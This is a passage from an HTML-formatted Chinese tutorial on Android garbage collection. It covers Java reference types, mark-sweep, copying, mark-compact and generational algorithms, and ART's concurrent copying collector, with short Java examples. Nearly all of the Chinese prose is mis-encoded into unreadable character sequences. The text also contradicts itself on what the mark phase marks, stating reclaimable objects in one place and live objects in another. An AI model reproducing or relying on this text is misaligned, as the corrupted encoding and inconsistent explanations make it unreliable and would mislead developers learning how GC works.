<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>Androidä¸æ¨èä½¿ç”¨è½¯å¼•ç”¨</li>
<li>å› ä¸ºAndroidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œè½¯å¼•ç”¨å¯èƒ½å¾ˆå¿«è¢«å›æ”¶</li>
<li>å»ºè®®ä½¿ç”¨LruCacheç­‰æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">SoftReference&lt;Bitmap&gt; softRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;&gt;(bitmap);
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> softRef.get();  <span class="hljs-comment">// å¯èƒ½è¿”å›nullï¼ˆå¦‚æœè¢«å›æ”¶äº†ï¼‰</span>
</code></pre>
<p><strong>3. å¼±å¼•ç”¨ï¼ˆWeak Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>åªè¦GCå°±ä¼šå›æ”¶ï¼Œä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶</li>
<li>é€‚åˆé¿å…å†…å­˜æ³„æ¼çš„åœºæ™¯</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆHandlerã€é™æ€å˜é‡æŒæœ‰å¯¹è±¡æ—¶ï¼‰</li>
<li>ç¼“å­˜åœºæ™¯ï¼ˆWeakHashMapï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é¿å…Handlerå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
        <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> activityRef.get();
        <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ä½¿ç”¨activity</span>
        }
    }
}
</code></pre>
<p><strong>4. è™šå¼•ç”¨ï¼ˆPhantom Referenceï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æœ€å¼±çš„å¼•ç”¨ç±»å‹</li>
<li>ä¸»è¦ç”¨äºå¯¹è±¡å›æ”¶å‰çš„æ¸…ç†å·¥ä½œ</li>
<li>æ— æ³•é€šè¿‡è™šå¼•ç”¨è·å–å¯¹è±¡</li>
</ul>
<p><strong>Androidä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¾ˆå°‘ä½¿ç”¨</li>
<li>ä¸»è¦ç”¨äºç‰¹æ®Šåœºæ™¯ï¼ˆå¦‚ç›´æ¥å†…å­˜çš„æ¸…ç†ï¼‰</li>
</ul>
<h4 data-id="heading-7">1.3 Androidä¸­çš„å¯¹è±¡å›æ”¶</h4>
<p><strong>å †å†…å­˜å›æ”¶ï¼š</strong></p>
<ul>
<li>ä¸»è¦å›æ”¶åŒºåŸŸ</li>
<li>å›æ”¶å¯¹è±¡å®ä¾‹ï¼ˆé€šè¿‡newåˆ›å»ºçš„å¯¹è±¡ï¼‰</li>
<li>è¿™æ˜¯GCçš„ä¸»è¦å·¥ä½œ</li>
</ul>
<p><strong>æ–¹æ³•åŒºå›æ”¶ï¼š</strong></p>
<ul>
<li>å›æ”¶ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰</li>
<li>Androidä¸­è¾ƒå°‘ï¼Œå› ä¸ºç±»ä¿¡æ¯é€šå¸¸ä¸ä¼šé¢‘ç¹å˜åŒ–</li>
</ul>
<p><strong>å›æ”¶æ—¶æœºï¼š</strong></p>
<ul>
<li>ç³»ç»Ÿè‡ªåŠ¨åˆ¤æ–­ï¼Œå¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨è§¦å‘</li>
<li>ä¸å»ºè®®è°ƒç”¨System.gc()ï¼Œå› ä¸ºä¼šå¼ºåˆ¶è§¦å‘Full GCï¼Œå¯èƒ½å¯¼è‡´å¡é¡¿</li>
</ul>
<hr/>
<h2 data-id="heading-8">ç¬¬äºŒéƒ¨åˆ†ï¼šåƒåœ¾å›æ”¶ç®—æ³•ï¼ˆAndroid ARTä½¿ç”¨çš„ç®—æ³•ï¼‰</h2>
<p><strong>è¯´æ˜ï¼šè¿™éƒ¨åˆ†ä»‹ç»GCç®—æ³•çš„åŸºæœ¬åŸç†ï¼ŒAndroid ARTä¸»è¦ä½¿ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•</strong></p>
<h3 data-id="heading-9">2. åƒåœ¾å›æ”¶ç®—æ³•</h3>
<h4 data-id="heading-10">2.1 æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark-Sweepï¼‰</h4>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<p>åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šä»GC Rootså¼€å§‹ï¼Œæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…é™¤æ‰€æœ‰è¢«æ ‡è®°çš„å¯¹è±¡</li>
</ol>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä»GC Rootså¼€å§‹éå†
<span class="hljs-bullet">2.</span> æ ‡è®°æ‰€æœ‰å¯è¾¾å¯¹è±¡ï¼ˆå­˜æ´»å¯¹è±¡ï¼‰
<span class="hljs-bullet">3.</span> æ¸…é™¤æ‰€æœ‰æœªæ ‡è®°çš„å¯¹è±¡ï¼ˆåƒåœ¾å¯¹è±¡ï¼‰
</code></pre>
<p><strong>å›¾ç¤ºï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ ‡è®°å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[å¯¹è±¡4]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
  âœ“      âœ—      âœ“      âœ—      âœ“
 å­˜æ´»   åƒåœ¾    å­˜æ´»   åƒåœ¾    å­˜æ´»

æ¸…é™¤åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
  âœ“            âœ“            âœ“
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°ç®€å•</li>
<li>ä¸éœ€è¦ç§»åŠ¨å¯¹è±¡</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>äº§ç”Ÿå†…å­˜ç¢ç‰‡</strong>ï¼šæ¸…é™¤åç•™ä¸‹ä¸è¿ç»­çš„å†…å­˜ç©ºé—´</li>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ä¸¤æ¬¡éå†ï¼ˆæ ‡è®°å’Œæ¸…é™¤ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidä¸ä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</li>
<li>å› ä¸ºä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡ï¼Œå½±å“åç»­å†…å­˜åˆ†é…æ•ˆç‡</li>
</ul>
<h4 data-id="heading-11">2.2 æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆMark-Copyï¼‰- <strong>Androidä¸»è¦ä½¿ç”¨è¿™ä¸ª</strong></h4>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<p>å°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨ä¸€å—ã€‚å›æ”¶æ—¶ï¼Œå°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ï¼Œç„¶åæ¸…ç©ºå½“å‰å—ã€‚</p>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. å°†å†…å­˜åˆ†ä¸º<span class="hljs-selector-tag">From</span>åŒºå’Œ<span class="hljs-selector-tag">To</span>åŒº
<span class="hljs-number">2</span>. å¯¹è±¡åˆ†é…åœ¨<span class="hljs-selector-tag">From</span>åŒº
<span class="hljs-number">3</span>. å›æ”¶æ—¶ï¼š
   - æ ‡è®°<span class="hljs-selector-tag">From</span>åŒºä¸­çš„å­˜æ´»å¯¹è±¡
   - å°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°<span class="hljs-selector-tag">To</span>åŒº
   - æ¸…ç©º<span class="hljs-selector-tag">From</span>åŒº
<span class="hljs-number">4</span>. <span class="hljs-selector-tag">From</span>åŒºå’Œ<span class="hljs-selector-tag">To</span>åŒºè§’è‰²äº’æ¢
</code></pre>
<p><strong>å›¾ç¤ºï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">å›æ”¶å‰ï¼š
FromåŒº: <span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[å¯¹è±¡2]</span><span class="hljs-section">[å¯¹è±¡3]</span><span class="hljs-section">[å¯¹è±¡4]</span>
        å­˜æ´»   åƒåœ¾   å­˜æ´»   åƒåœ¾
ToåŒº:   <span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span>

å›æ”¶åï¼š
FromåŒº: <span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span>
ToåŒº:   <span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[å¯¹è±¡3]</span>
        å­˜æ´»   å­˜æ´»
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šå¤åˆ¶åå†…å­˜è¿ç»­</li>
<li>å›æ”¶æ•ˆç‡é«˜ï¼šåªéœ€è¦å¤åˆ¶å­˜æ´»å¯¹è±¡</li>
<li>é€‚åˆå¹´è½»ä»£ï¼šå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå­˜æ´»å¯¹è±¡å°‘</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æµªè´¹ä¸€åŠå†…å­˜ï¼šéœ€è¦ä¸¤å—å†…å­˜ï¼Œä½†åªä½¿ç”¨ä¸€å—</li>
<li>å¯¹è±¡å­˜æ´»ç‡é«˜æ—¶æ•ˆç‡ä½ï¼šéœ€è¦å¤åˆ¶å¾ˆå¤šå¯¹è±¡</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li><strong>Android ARTä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</strong></li>
<li>é€‚åˆå¹´è½»ä»£å›æ”¶ï¼ˆå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼‰</li>
<li>é€šè¿‡ä¼˜åŒ–ï¼Œåªæµªè´¹10%çš„å†…å­˜ï¼ˆè€Œä¸æ˜¯50%ï¼‰</li>
</ul>
<p><strong>æ”¹è¿›ç®—æ³•ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼š</strong></p>
<p>å°†å†…å­˜åˆ†ä¸ºEdenåŒºå’Œä¸¤ä¸ªSurvivoråŒºï¼š</p>
<ul>
<li>EdenåŒºï¼šæ–°å¯¹è±¡åˆ†é…åœ¨è¿™é‡Œ</li>
<li>Survivor0å’ŒSurvivor1ï¼šç”¨äºå­˜æ”¾å­˜æ´»å¯¹è±¡</li>
</ul>
<p><strong>é»˜è®¤æ¯”ä¾‹ï¼š</strong></p>
<ul>
<li>Eden : Survivor0 : Survivor1 = 8 : 1 : 1</li>
<li>åªæµªè´¹10%çš„å†…å­˜ï¼Œè€Œä¸æ˜¯50%</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡åˆ†é…åœ¨EdenåŒº
<span class="hljs-bullet">2.</span> EdenåŒºæ»¡æ—¶ï¼Œè§¦å‘Minor GC
<span class="hljs-bullet">3.</span> å°†EdenåŒºå’ŒSurvivor0ä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°Survivor1
<span class="hljs-bullet">4.</span> æ¸…ç©ºEdenåŒºå’ŒSurvivor0
<span class="hljs-bullet">5.</span> Survivor0å’ŒSurvivor1è§’è‰²äº’æ¢
</code></pre>
<h4 data-id="heading-12">2.3 æ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆMark-Compactï¼‰</h4>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<p>åˆ†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ•´ç†é˜¶æ®µ</strong>ï¼šå°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
</ol>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ ‡è®°æ‰€æœ‰å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">2.</span> å°†å­˜æ´»å¯¹è±¡ç§»åŠ¨åˆ°ä¸€ç«¯ï¼ˆæ•´ç†ï¼‰
<span class="hljs-bullet">3.</span> æ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜
</code></pre>
<p><strong>å›¾ç¤ºï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ•´ç†å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
  âœ“            âœ“            âœ“

æ•´ç†åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
  âœ“      âœ“      âœ“
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šæ•´ç†åå†…å­˜è¿ç»­</li>
<li><strong>ä¸æµªè´¹å†…å­˜</strong>ï¼šä¸éœ€è¦ä¸¤å—å†…å­˜</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
<li>é€‚åˆè€å¹´ä»£ï¼šå¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidåœ¨æŸäº›åœºæ™¯ä¸‹ä½¿ç”¨</li>
<li>ä¸»è¦ç”¨äºè€å¹´ä»£å›æ”¶ï¼ˆé¿å…å†…å­˜ç¢ç‰‡ï¼‰</li>
</ul>
<h4 data-id="heading-13">2.4 åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆAndroidä½¿ç”¨è¿™ä¸ªç­–ç•¥ï¼‰</h4>
<p><strong>ç†è®ºåŸºç¡€ï¼š</strong></p>
<p>æ ¹æ®å¯¹è±¡ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œå°†å†…å­˜åˆ†ä¸ºä¸åŒçš„ä»£ï¼š</p>
<ul>
<li><strong>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­</strong>ï¼šåˆ›å»ºåå¾ˆå¿«è¢«å›æ”¶</li>
<li><strong>å°‘æ•°å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆé•¿</strong>ï¼šé•¿æœŸå­˜æ´»</li>
</ul>
<p><strong>åˆ†ä»£ç­–ç•¥ï¼š</strong></p>
<p><strong>å¹´è½»ä»£ï¼ˆYoung Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸçŸ­</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆå¿«é€Ÿé«˜æ•ˆï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šé«˜ï¼ˆé¢‘ç¹å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šPartial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šçŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>è€å¹´ä»£ï¼ˆOld Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆé¿å…ç¢ç‰‡ï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šä½ï¼ˆå¶å°”å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šFull GCï¼ˆå®Œå…¨å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šé•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„åˆ†ä»£æ”¶é›†ï¼š</strong></p>
<ol>
<li>
<p><strong>å¹´è½»ä»£ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•</strong></p>
<ul>
<li>å¿«é€Ÿå›æ”¶ï¼Œé€‚åˆé¢‘ç¹å›æ”¶</li>
<li>å¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå¤åˆ¶æˆæœ¬ä½</li>
</ul>
</li>
<li>
<p><strong>è€å¹´ä»£ç”¨æ ‡è®°-æ•´ç†ç®—æ³•</strong></p>
<ul>
<li>é¿å…å†…å­˜ç¢ç‰‡</li>
<li>å¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
</ul>
</li>
<li>
<p><strong>è¿™æ ·è®¾è®¡çš„å¥½å¤„ï¼š</strong></p>
<ul>
<li>æé«˜GCæ•ˆç‡</li>
<li>å‡å°‘GCæš‚åœæ—¶é—´</li>
<li>å‡å°‘å†…å­˜ç¢ç‰‡</li>
</ul>
</li>
</ol>
<p><strong>å¯¹è±¡æ™‹å‡è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡ â†’ å¹´è½»ä»£ï¼ˆEdenåŒºï¼‰
<span class="hljs-bullet">2.</span> å¹´è½»ä»£GC â†’ å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
<span class="hljs-bullet">3.</span> å¤šæ¬¡GCåä»å­˜æ´» â†’ æ™‹å‡åˆ°è€å¹´ä»£
<span class="hljs-bullet">4.</span> è€å¹´ä»£GC â†’ å›æ”¶é•¿æœŸå­˜æ´»çš„å¯¹è±¡
</code></pre>
<hr/>
<h2 data-id="heading-14">ç¬¬ä¸‰éƒ¨åˆ†ï¼šAndroid ARTåƒåœ¾å›æ”¶å™¨</h2>
<h3 data-id="heading-15">3. Android ARTåƒåœ¾å›æ”¶å™¨ï¼ˆGarbage Collectorï¼‰</h3>
<p><strong>æ ¸å¿ƒè¯´æ˜ï¼šAndroid ARTåªæœ‰ä¸€ç§åƒåœ¾å›æ”¶å™¨ï¼Œå«åš"å¹¶å‘å¤åˆ¶æ”¶é›†å™¨"</strong></p>
<h4 data-id="heading-16">3.1 ARTä¸JVMçš„åŒºåˆ«</h4>
<p><strong>ARTï¼ˆAndroid Runtimeï¼‰ä¸æ˜¯JVMï¼š</strong></p>
<ol>
<li>
<p><strong>ç¼–è¯‘æ–¹å¼ä¸åŒ</strong>ï¼š</p>
<ul>
<li>ARTï¼šAOTç¼–è¯‘ï¼ˆAhead-Of-Timeï¼‰ï¼Œå®‰è£…æ—¶ç¼–è¯‘</li>
<li>JVMï¼šJITç¼–è¯‘ï¼ˆJust-In-Timeï¼‰ï¼Œè¿è¡Œæ—¶ç¼–è¯‘</li>
</ul>
</li>
<li>
<p><strong>GCæœºåˆ¶ä¸åŒ</strong>ï¼š</p>
<ul>
<li>ARTï¼šåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼ˆå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼‰</li>
<li>JVMï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆSerialã€Parallelã€CMSã€G1ã€ZGCç­‰ï¼‰</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŒ–æ–¹å‘ä¸åŒ</strong>ï¼š</p>
<ul>
<li>ARTï¼šé’ˆå¯¹ä½å»¶è¿Ÿä¼˜åŒ–ï¼Œé€‚åˆäº¤äº’å¼åº”ç”¨</li>
<li>JVMï¼šæœ‰å¤šç§ä¼˜åŒ–æ–¹å‘ï¼ˆååé‡ã€å»¶è¿Ÿç­‰ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>ARTçš„GCä¸“é—¨ä¸ºAndroidåº”ç”¨ä¼˜åŒ–ï¼š</strong></p>
<ul>
<li>å‡å°‘å¡é¡¿ï¼šä½å»¶è¿Ÿè®¾è®¡</li>
<li>æå‡æµç•…åº¦ï¼šå¹¶å‘å›æ”¶ï¼Œå‡å°‘æš‚åœæ—¶é—´</li>
<li>é€‚åˆäº¤äº’å¼åº”ç”¨ï¼šä¼˜åŒ–ç”¨æˆ·æ»‘åŠ¨ã€ç‚¹å‡»ç­‰æ“ä½œ</li>
</ul>
<h4 data-id="heading-17">3.2 Androidçš„åƒåœ¾å›æ”¶å™¨æ˜¯ä»€ä¹ˆ</h4>
<p><strong>åªæœ‰ä¸€ä¸ªä¸»è¦çš„åƒåœ¾å›æ”¶å™¨ï¼šå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼Œç®€ç§°CCï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>Androidåªæœ‰è¿™ä¸€ç§æ”¶é›†å™¨</li>
<li>æ²¡æœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆä¸åƒJVMæœ‰Serialã€Parallelã€CMSã€G1ã€ZGCç­‰ï¼‰</li>
<li>Androidå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©æ”¶é›†å™¨ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨è¿™ä¸ªæ”¶é›†å™¨</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªï¼š</strong></p>
<ul>
<li>é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–ï¼šä½å»¶è¿Ÿã€äº¤äº’å¼åº”ç”¨</li>
<li>ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©ï¼šç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</li>
<li>ç®€åŒ–å¼€å‘ï¼šå¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«</li>
</ul>
<h4 data-id="heading-18">3.3 è¿™ä¸ªåƒåœ¾å›æ”¶å™¨æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼ˆéƒ½æ˜¯åŒä¸€ä¸ªæ”¶é›†å™¨çš„ç‰¹æ€§ï¼Œä¸æ˜¯æ­¥éª¤ï¼Œä¹Ÿä¸æ˜¯ä¸åŒçš„å›æ”¶æ–¹å¼ï¼‰</h4>
<p><strong>è¯´æ˜ï¼šè¿™äº›éƒ½æ˜¯"å¹¶å‘å¤åˆ¶æ”¶é›†å™¨"çš„ç‰¹æ€§ï¼Œå®ƒä»¬åŒæ—¶å‘æŒ¥ä½œç”¨ï¼Œè®©å›æ”¶æ›´é«˜æ•ˆã€æ›´å°‘å¡é¡¿</strong></p>
<h5 data-id="heading-19">3.3.1 åˆ†ä»£å›æ”¶ç­–ç•¥ï¼ˆå›æ”¶ç­–ç•¥ï¼‰</h5>
<p><strong>å†…å­˜åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</strong></p>
<ol>
<li><strong>å¹´è½»ä»£</strong>ï¼šå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆç”Ÿå‘½å‘¨æœŸçŸ­ï¼‰</li>
<li><strong>è€å¹´ä»£</strong>ï¼šå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼ˆç”Ÿå‘½å‘¨æœŸé•¿ï¼‰</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆåˆ†ä»£ï¼Ÿ</strong></p>
<p>å› ä¸ºå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«å°±ä¼šè¢«å›æ”¶ï¼Œåˆ†å¼€å¤„ç†æ›´é«˜æ•ˆï¼š</p>
<ul>
<li>å¹´è½»ä»£ï¼šé¢‘ç¹å›æ”¶ï¼Œç”¨å¿«é€Ÿç®—æ³•ï¼ˆæ ‡è®°-å¤åˆ¶ï¼‰</li>
<li>è€å¹´ä»£ï¼šå¶å°”å›æ”¶ï¼Œç”¨é¿å…ç¢ç‰‡çš„ç®—æ³•ï¼ˆæ ‡è®°-æ•´ç†ï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// è¿™äº›å¯¹è±¡åœ¨å¹´è½»ä»£</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¤§éƒ¨åˆ†å¾ˆå¿«è¢«å›æ”¶</span>
    }
    
    <span class="hljs-comment">// è¿™ä¸ªå¯¹è±¡å¯èƒ½æ™‹å‡åˆ°è€å¹´ä»£</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">longLived</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-comment">// å¦‚æœå¤šæ¬¡GCåä»å­˜æ´»ï¼Œä¼šè¿›å…¥è€å¹´ä»£</span>
}
</code></pre>
<h5 data-id="heading-20">3.3.2 å¹¶å‘å›æ”¶ï¼ˆæ‰§è¡Œæ–¹å¼ï¼‰</h5>
<p><strong>åœ¨åå°çº¿ç¨‹æ‰§è¡Œåƒåœ¾å›æ”¶ï¼š</strong></p>
<ul>
<li>å°½é‡ä¸æš‚åœä¸»çº¿ç¨‹ï¼ˆåº”ç”¨ç»§ç»­è¿è¡Œï¼‰</li>
<li>è¿™æ ·å¯ä»¥å‡å°‘å¡é¡¿</li>
</ul>
<p><strong>å¹¶å‘å›æ”¶çš„ä¼˜åŠ¿ï¼š</strong></p>
